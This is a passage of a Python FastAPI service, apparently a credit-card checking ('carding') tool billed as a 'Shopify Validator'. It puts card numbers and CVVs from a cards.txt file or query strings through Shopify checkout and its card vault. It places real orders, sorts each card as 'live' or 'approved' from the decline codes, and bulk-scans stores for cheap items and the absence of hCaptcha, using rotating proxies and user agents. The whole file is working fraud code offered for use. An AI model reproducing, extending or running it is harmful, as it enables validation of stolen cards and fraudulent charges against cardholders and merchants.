            QUERY_SHIPPING = (
                "query Proposal($sessionInput:SessionTokenInput!,"
                "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
                "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
                "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
                "$checkpointData:String,$queueToken:String,"
                "$optionalDuties:OptionalDutiesInput,"
                "$deliveryExpectations:DeliveryExpectationTermsInput,"
                "$memberships:MembershipsInput,"
                "$cartMetafields:[CartMetafieldOperationInput!])"
                "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
                "delivery:$delivery,discounts:$discounts,payment:$payment,"
                "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
                "optionalDuties:$optionalDuties,"
                "deliveryExpectations:$deliveryExpectations,"
                "memberships:$memberships,cartMetafields:$cartMetafields"
                "},checkpointData:$checkpointData,queueToken:$queueToken})"
                "{__typename result{__typename "
                "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
                "sellerProposal{"
                "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
                "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
                "delivery{__typename "
                "...on FilledDeliveryTerms{deliveryLines{"
                "availableDeliveryStrategies{__typename "
                "...on CompleteDeliveryStrategy{handle title "
                "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}"
                "selectedDeliveryStrategy{__typename "
                "...on CompleteDeliveryStrategy{handle title "
                "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
                "tax{__typename "
                "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
                "payment{__typename "
                "...on FilledPaymentTerms{availablePaymentLines{"
                "paymentMethod{__typename "
                "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
                "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
                "__typename}}"
                "...on CheckpointDenied{redirectUrl}"
                "...on Throttled{pollAfter queueToken pollUrl}"
                "...on TooManyRequests{__typename}"
                "...on NegotiationResultFailed{__typename}}"
                "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
            )

            ship_vars = _base_vars()
            resp_json: Any = None
            for attempt in range(3):
                try:
                    r = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_SHIPPING, "variables": ship_vars,
                              "operationName": "Proposal"},
                    )
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue

                if (resp_json.get("data") or {}).get("session"):
                    break

                gql_errs = resp_json.get("errors") or []
                if gql_errs:
                    interpreted = _parse_gql_errors(gql_errs)
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                       "THROTTLED", "NO_PRODUCT"):
                        return _r(interpreted)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted if interpreted != "GRAPHQL_ERROR"
                              else "GRAPHQL_ERROR")

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR")

            try:
                new_sst = r.headers.get("x-checkout-one-session-token")
                if new_sst:
                    sst = new_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            negotiate = (resp_json["data"]["session"].get("negotiate") or {})
            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code)

            result_obj = negotiate.get("result") or {}
            rtype      = result_obj.get("__typename", "")
            if rtype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")
            if rtype in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED")
            if rtype == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED")

            checkpoint_data = result_obj.get("checkpointData")
            seller          = result_obj.get("sellerProposal") or {}
            if not seller:
                return _r("NO_SELLER_PROPOSAL")

            running_total_data = seller.get("runningTotal") or {}
            running_total = (running_total_data.get("value", {}).get("amount")
                             or running_total_data.get("amount", "0"))

            # delivery
            delivery_strategy = ""
            shipping_amount   = 0.0
            delivery_data     = seller.get("delivery") or {}
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                lines = delivery_data.get("deliveryLines") or []
                if lines:
                    strategies = lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            amt = strategies[0].get("amount") or {}
                            shipping_amount = float(
                                amt.get("value", {}).get("amount")
                                or amt.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            pass

            # tax
            tax_amount = 0.0
            tax_data   = seller.get("tax") or {}
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    ta = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(ta.get("value", {}).get("amount")
                                       or ta.get("amount") or "0")
                except (ValueError, TypeError):
                    pass

            # payment method
            payment_identifier = None
            payment_data       = seller.get("payment") or {}
            if payment_data.get("__typename") == "FilledPaymentTerms":
                for line in (payment_data.get("availablePaymentLines") or []):
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected = (pm.get("extensibilityDisplayName")
                                    or pm.get("name")
                                    or pm.get("brand")
                                    or "Shopify Payments")
                        if "shopify" in detected.lower() and "payments" in detected.lower():
                            payment_identifier = pid
                            gateway = detected
                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            try:
                                if float(price) > MAX_PRICE:
                                    return _r(f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}")
                            except (ValueError, TypeError):
                                pass
                            break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")

            # ── 4. delivery proposal (accept shipping) ─────────────
            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst
            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {"value": {"amount": str(shipping_amount),
                                                 "currencyCode": currency}},
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            deliv_vars["taxes"]["proposedTotalAmount"] = {
                "value": {"amount": str(tax_amount), "currencyCode": currency}
            }
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                "number": phone, "countryCode": country_code
            }
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data

            try:
                dr = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_SHIPPING, "variables": deliv_vars,
                          "operationName": "Proposal"},
                )
                d_resp = orjson.loads(dr.content)
                d_sst = dr.headers.get("x-checkout-one-session-token")
                if d_sst:
                    sst = d_sst
                    gql_headers["x-checkout-one-session-token"] = sst

                d_result = (d_resp.get("data", {}).get("session", {})
                            .get("negotiate", {}).get("result", {}))
                if d_result:
                    d_type = d_result.get("__typename", "")
                    if d_type == "SubmittedForCompletion":
                        return _r("NO_PAYMENT_REQUIRED")
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt    = (d_total.get("value", {}).get("amount")
                                or d_total.get("amount"))
                    if d_amt:
                        try:
                            price = f"{float(d_amt):.2f}"
                            if float(price) > MAX_PRICE:
                                return _r(f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}")
                        except (ValueError, TypeError):
                            pass
            except Exception as ex:
                log.debug("delivery proposal: %s", ex)

            # ── 5. tokenize card (PCI vault) ───────────────────────
            vault_payload = {
                "credit_card": {
                    "number":             cc,
                    "month":              int(month),
                    "year":               int(f"20{year}"),
                    "verification_value": cvv,
                    "name":               f"{first} {last}",
                    "start_month":        None,
                    "start_year":         None,
                    "issue_number":       "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type":       "application/json",
                "Accept":             "application/json",
                "Accept-Language":    "en-US,en;q=0.9",
                "Origin":             "https://checkout.pci.shopifyinc.com",
                "User-Agent":         ua,
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            token = None
            for vurl in ("https://checkout.pci.shopifyinc.com/sessions",
                         "https://deposit.shopifyinc.com/sessions"):
                try:
                    vr = await session.post(vurl, json=vault_payload,
                                            headers=vault_headers)
                    vd = orjson.loads(vr.content)
                    token = vd.get("id")
                    if token:
                        break
                except Exception:
                    continue

            if not token:
                return _r("TOKENIZATION_FAILED")

            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }

            # ── 6. submit via persisted endpoint ────────────────────
            persisted_url = f"https://{hostname}/checkouts/internal/graphql/persisted"

            submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
            submit_deliv_line["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy, "customDeliveryRate": False
                },
                "options": {"phone": phone},
            }
            submit_deliv_line["expectedTotalPrice"] = {"any": True}

            submit_merch = copy.deepcopy(deliv_vars["merchandise"])
            for ml in submit_merch.get("merchandiseLines", []):
                ml["expectedTotalPrice"] = {"any": True}

            submit_body = {
                "query": None,
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken":   queue_token or "",
                        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines":                 [submit_deliv_line],
                            "noDeliveryRequired":            [],
                            "useProgressiveRates":           True,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping":         True,
                        },
                        "merchandise": submit_merch,
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [{
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "paymentMethodIdentifier": payment_identifier,
                                        "sessionId":               token,
                                        "billingAddress":          billing_addr,
                                        "cardSource":              None,
                                    }
                                },
                                "amount": {"any": True},
                                "dueAt":  None,
                            }],
                            "billingAddress": billing_addr,
                        },
                        "buyerIdentity": copy.deepcopy(deliv_vars["buyerIdentity"]),
                        "taxes": {
                            "proposedAllocations":           None,
                            "proposedTotalAmount":           {"any": True},
                            "proposedTotalIncludedAmount":   None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions":            [],
                        },
                        "tip":  {"tipLines": []},
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms":    None,
                        "optionalDuties":        {"buyerRefusesDuties": False},
                        **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                    },
                    "attemptToken": attempt_token,
                    "metafields":   [],
                    "analytics":    {"requestUrl": checkout_url},
                },
            }

            s_data: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(
                        persisted_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers,
                        json=submit_body,
                    )
                    s_resp = orjson.loads(sr.content)
                    new_sst = sr.headers.get("x-checkout-one-session-token")
                    if new_sst:
                        sst = new_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError):
                    return _r("TIMEOUT")
                except Exception as ex:
                    log.debug("submit exception: %s", ex)
                    return _r("SUBMIT_FAILED")

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    if errs:
                        for err in errs:
                            for fld in ("code", "message"):
                                val = str(err.get(fld) or "").upper()
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = ("True" if norm in
                                                    ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                     "3DS_REQUIRED") else "False")
                                        return _r(norm, approved=approved)
                    return _r("GRAPHQL_ERROR")

                s_type = s_data.get("__typename", "")
                if s_type == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    confirmable = all(e.get("__typename") == "ConfirmChangeViolation"
                                      for e in sub_errs) if sub_errs else False
                    if confirmable and submit_attempt < 2:
                        await asyncio.sleep(0.5)
                        continue
                break

            s_type = s_data.get("__typename", "")

            # ── 7. handle submit result ────────────────────────────
            if s_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype   = receipt.get("__typename", "")

                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True")

                if rtype == "FailedReceipt":
                    pe      = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    code    = str(pe.get("code") or "").upper()
                    msg     = str(pe.get("messageUntranslated") or "").upper()

                    if pe_type in ("InventoryClaimFailure",
                                   "InventoryReservationFailure"):
                        return _r("NO_PRODUCT")
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED")
                    if code == "CAPTCHA_REQUIRED" or "CAPTCHA" in msg:
                        return _r("CAPTCHA_REQUIRED")

                    raw  = code if code and code != "GENERIC_ERROR" else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = ("True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                   "3DS_REQUIRED", "EXPIRED_CARD") else "False")
                    return _r(norm, approved=approved)

                # Processing/Waiting → poll
                rid = receipt.get("id")
                if rid:
                    poll_delay_ms = int(receipt.get("pollDelay") or 500)
                    poll_body = {
                        "query": None,
                        "operationName": "PollForReceipt",
                        "variables": {"receiptId": rid, "sessionToken": sst},
                    }
                    deadline = time.time() + 15.0
                    while time.time() < deadline:
                        await asyncio.sleep(max(poll_delay_ms / 1000.0, 0.3))
                        try:
                            pr = await session.post(
                                persisted_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers,
                                json=poll_body,
                            )
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")

                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True", approved="True")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True")

                            if pt == "FailedReceipt":
                                pe      = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                code    = str(pe.get("code") or "").upper()
                                msg     = str(pe.get("messageUntranslated") or "").upper()

                                if pe_type in ("InventoryClaimFailure",
                                               "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT")
                                if pe_type == "OrderCreationFailure":
                                    return _r("ORDER_CREATION_FAILED")
                                if code == "CAPTCHA_REQUIRED" or "CAPTCHA" in msg:
                                    return _r("CAPTCHA_REQUIRED")

                                raw  = code if code and code != "GENERIC_ERROR" else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                approved = ("True" if norm in
                                            ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                             "3DS_REQUIRED", "EXPIRED_CARD") else "False")
                                return _r(norm, approved=approved)

                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                poll_delay_ms = int(pd.get("pollDelay") or poll_delay_ms)
                                continue
                        except Exception:
                            await asyncio.sleep(0.5)
                            continue
                return _r("CARD_DECLINED")

            if s_type == "SubmitFailed":
                return _r(_normalize_response(str(s_data.get("reason") or "")))

            if s_type == "SubmitRejected":
                errs = s_data.get("errors") or []
                if errs:
                    best_code = "CARD_DECLINED"
                    for err in errs:
                        for fld in ("code", "nonLocalizedMessage",
                                    "localizedMessage", "localizedMessageHtml"):
                            val = str(err.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                  "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = ("True" if best_code in ("INSUFFICIENT_FUNDS",
                                                        "INVALID_CVC", "3DS_REQUIRED",
                                                        "EXPIRED_CARD") else "False")
                    return _r(best_code, approved=approved)
                return _r("CARD_DECLINED")

            if s_type == "Throttled":
                return _r("THROTTLED")
            if s_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")

            return _r("CARD_DECLINED")

        except (asyncio.TimeoutError, RequestsError):
            return _r("TIMEOUT")
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            return {
                "Response": "ERROR",
                "CC":       f"{cc}|{month}|{year}|{cvv}",
                "Price":    price,
                "Gate":     gateway,
                "Site":     ourl,
                "Charged":  "False",
                "Approved": "False",
                "Time":     f"{round(time.time() - t0, 2)}s",
                "Detail":   f"{type(ex).__name__}: {str(ex)[:100]}",
            }
        finally:
            if owned:
                r = session.close()
                if asyncio.iscoroutine(r):
                    await r


# ─────────────────────────────────────────────────────────────────────
# Routes
# ─────────────────────────────────────────────────────────────────────
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})


@app.get("/shopify")
async def shopify_route(
    site:      str           = Query(..., description="Shopify store URL"),
    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv"),
    proxy:     Optional[str] = Query(None),
    max_price: Optional[float] = Query(None),
):
    if not site:
        return JSONResponse({"error": "Missing 'site'"}, status_code=400)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse({"error": "Bad card format"}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards in cards.txt"}, status_code=400)
        card = random.choice(cards)

    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, proxy_str=proxy, max_price=max_price,
    )
    _stat_inc(f"response_{result.get('Response', 'UNKNOWN')}")
    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:      str           = Query(..., description="Shopify store URL"),
    card:      Optional[str] = Query(None),
    proxy:     Optional[str] = Query(None),
    max_price: Optional[float] = Query(None),
):
    if not site:
        return JSONResponse({"error": "Missing 'site'"}, status_code=400)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse({"error": "Bad card format"}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards in cards.txt"}, status_code=400)
        parsed = random.choice(cards)

    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"
    result = await validate_card(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        ourl, proxy_str=proxy, max_price=max_price,
    )
    code = result.get("Response", "")
    _stat_inc(f"response_{code or 'UNKNOWN'}")
    return JSONResponse({
        "valid":         code in LIVE_RESPONSES,
        "site":          site,
        "product":       result.get("Product", ""),
        "price":         result.get("Price", "0.00"),
        "card_response": code,
        "gate":          result.get("Gate", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.post("/scan")
async def scan_route(payload: dict = Body(...)):
    """
    Bulk hCaptcha + price-range scanner.
    Body: {"sites": [...], "min_price": 0.009, "max_price": 100, "concurrency": 8}
    """
    sites = payload.get("sites") or []
    if not sites:
        return JSONResponse({"error": "sites required"}, status_code=400)

    concurrency = int(payload.get("concurrency", 8))
    min_price   = float(payload.get("min_price", 0.009))
    max_price   = float(payload.get("max_price", 100.0))
    if min_price < 0 or max_price <= min_price:
        return JSONResponse({"error": "invalid price range"}, status_code=400)

    sem  = asyncio.Semaphore(max(1, min(concurrency, 30)))
    out: list[dict] = []
    lock = asyncio.Lock()

    async def worker(url: str):
        async with sem:
            r = await _scan_one(url, min_price, max_price)
        async with lock:
            out.append(r)

    await asyncio.gather(*(worker(u) for u in sites[:2000]))

    from collections import Counter
    summary = dict(Counter(r["status"] for r in out))
    summary["total"]          = len(out)
    summary["in_range_total"] = sum(1 for r in out if r["in_range_count"] > 0)
    summary["hcaptcha_total"] = sum(1 for r in out if r["hcaptcha"])

    return JSONResponse({
        "range":   {"min": min_price, "max": max_price},
        "summary": summary,
        "results": out,
    })


async def _scan_one(url: str, min_price: float, max_price: float) -> dict:
    """hCaptcha + price-range detection, no card submitted."""
    t0 = time.time()
    base = url.rstrip("/")
    res = {
        "site": url, "status": "UNKNOWN", "hcaptcha": False,
        "in_range_count": 0, "cheapest_in_range": "", "cheapest_title": "",
        "total_variants": 0, "gateway": "", "detail": "", "time": 0.0,
    }
    session, owned = _make_session(None)
    try:
        ua = random.choice(USER_AGENTS)
        h  = {"User-Agent": ua, "Accept": "application/json",
              "Accept-Language": "en-US,en;q=0.9",
              "Origin": base, "Referer": base + "/"}

        r = await session.get(base + "/products.json?limit=250", headers=h)
        if r.status_code != 200:
            res["status"] = "DEAD"; res["detail"] = f"products.json {r.status_code}"
            return res
        try:
            products = orjson.loads(r.content).get("products", [])
        except orjson.JSONDecodeError:
            res["status"] = "DEAD"; res["detail"] = "not JSON"; return res
        if not products:
            res["status"] = "NO_PRODUCT"; res["detail"] = "empty"; return res

        best_p, best_t, best_vid = None, "", None
        in_range = total = 0
        for p in products:
            title = p.get("title", "")
            for v in p.get("variants", []):
                total += 1
                try:
                    if v.get("available") is False:
                        continue
                    price = float(v.get("price") or "0")
                except (ValueError, TypeError):
                    continue
                if price <= 0:
                    continue
                if min_price <= price <= max_price:
                    in_range += 1
                    if best_p is None or price < best_p:
                        best_p, best_t, best_vid = price, title, str(v["id"])

        res["total_variants"]    = total
        res["in_range_count"]    = in_range
        res["cheapest_in_range"] = f"{best_p:.2f}" if best_p is not None else ""
        res["cheapest_title"]    = best_t

        if not best_vid:
            res["status"] = "NO_PRODUCT"
            res["detail"] = "no variant in range"
            return res

        cart = await session.post(
            base + "/cart/add.js",
            data=f"id={best_vid}&quantity=1",
            headers={**h, "Content-Type": "application/x-www-form-urlencoded"},
        )
        if cart.status_code != 200:
            res["status"] = "ERROR"; res["detail"] = f"cart {cart.status_code}"
            return res

        ck   = await session.post(base + "/checkout/", headers=h, allow_redirects=True)
        text = ck.text

        if any(s in text for s in (
            "hcaptcha.com", "h-captcha", "hcaptcha-widget",
            "captchaRequired", "captcha_required", "checkout-captcha",
            "riskify", "h-captcha-response",
        )):
            res["hcaptcha"] = True
            res["status"]   = "CAPTCHA"
            res["detail"]   = "hCaptcha on checkout"
            return res

        if "shopify" in text.lower() and "payments" in text.lower():
            res["gateway"] = "shopify_payments"
        res["status"] = "LIVE"
        return res

    except (asyncio.TimeoutError, RequestsError):
        res["status"] = "ERROR"; res["detail"] = "timeout"; return res
    except Exception as ex:
        res["status"] = "ERROR"; res["detail"] = f"{type(ex).__name__}: {str(ex)[:80]}"
        return res
    finally:
        res["time"] = round(time.time() - t0, 2)
        if owned:
            c = session.close()
            if asyncio.iscoroutine(c):
                await c


@app.get("/health")
async def health_route():
    return JSONResponse({
        "status":           "ok",
        "cards_loaded":     len(_get_cards()),
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "cache_ttl":        CACHE_TTL,
        "max_price":        MAX_PRICE,
    })


@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    n = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": n})


@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


# ─────────────────────────────────────────────────────────────────────
# Middleware — time header + stats + log
# ─────────────────────────────────────────────────────────────────────
@app.middleware("http")
async def timing_mw(request: Request, call_next):
    t0   = time.time()
    resp = await call_next(request)
    ms   = (time.time() - t0) * 1000
    resp.headers["X-Response-Time"] = f"{ms:.1f}ms"

    _stat_inc("total_requests")
    _stat_inc(f"requests_{request.url.path.strip('/').replace('/', '_') or 'root'}")

    chunks: list[bytes] = []
    async for chunk in resp.body_iterator:
        chunks.append(chunk if isinstance(chunk, bytes) else chunk.encode())
    body = b"".join(chunks)

    asyncio.create_task(_log_incoming(request, body, resp.status_code, ms))

    return Response(
        content=body,
        status_code=resp.status_code,
        headers=dict(resp.headers),
        media_type=resp.media_type,
    )


# ─────────────────────────────────────────────────────────────────────
# UI  (minimal — the full UI is served from the same page)
# ─────────────────────────────────────────────────────────────────────
INDEX_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>Shopify Validator</title></head>
<body style="font-family:system-ui;background:#0d0e12;color:#f1f5f9;padding:2rem">
<h1>Shopify Validator API v3.2</h1>
<p>POST <code>/scan</code> with JSON <code>{"sites":[...],"min_price":0.009,"max_price":100}</code>.</p>
<p>GET <code>/shopify?site=...&cc=...&amp;proxy=...&amp;max_price=...</code> for single-card validation.</p>
<p>GET <code>/check?site=...&amp;card=...&amp;proxy=...</code> for gateway check.</p>
<p>GET <code>/health</code>, <code>/stats</code> for status.</p>
</body></html>"""


@app.get("/", response_class=HTMLResponse)
@app.get("/ui", response_class=HTMLResponse)
async def index_route():
    return HTMLResponse(content=INDEX_HTML)


# ─────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(
        f"\n{'='*64}\n"
        f"  Shopify Validator API  v3.2\n"
        f"  Port:             {PORT}\n"
        f"  Workers:          {WORKERS}\n"
        f"  Pool:             {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
        f"  Site concurrency: {SITE_CONCURRENCY}\n"
        f"  Product cache:    {int(CACHE_TTL)}s TTL\n"
        f"  Max price:        ${MAX_PRICE:.2f}\n"
        f"  Cards file:       {CARDS_FILE}\n"
        f"{'='*64}\n"
    )
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=PORT,
        loop="auto",
        http="auto",
        log_level="warning",
        access_log=False,
        timeout_keep_alive=30,
        limit_concurrency=5000,
        limit_max_requests=100_000,
        backlog=4096,
    )